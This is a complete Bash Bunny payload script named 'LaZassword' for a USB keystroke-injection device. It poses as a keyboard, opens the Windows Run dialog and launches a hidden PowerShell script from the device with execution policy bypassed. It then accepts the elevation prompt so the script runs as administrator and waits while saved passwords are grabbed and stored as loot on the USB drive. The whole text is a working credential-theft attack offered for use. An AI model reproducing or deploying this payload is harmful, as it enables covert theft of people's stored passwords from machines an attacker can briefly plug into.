#!/bin/bash
#
# Title: LaZassword
# Author: kuyaya
# Version: 1.1

# Check readiness & prepare environment
LED SETUP
ATTACKMODE HID STORAGE

# Ensure loot is available for saving results.
mount /dev/nandf /root/udisk/

# Setup
DUCKY_LANG=ch
GET SWITCH_POSITION
GET TARGET_HOSTNAME 

# Attack
LED ATTACK

# Run lazassword.ps1 as admin
Q GUI r
Q STRING "powerShell -windowstyle hidden -ExecutionPolicy Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\lazassword.ps1')"
Q CTRL-SHIFT ENTER
sleep 1
Q LEFT
Q ENTER

# Wait until passwords are grabbed
sleep 15
LED FINISH
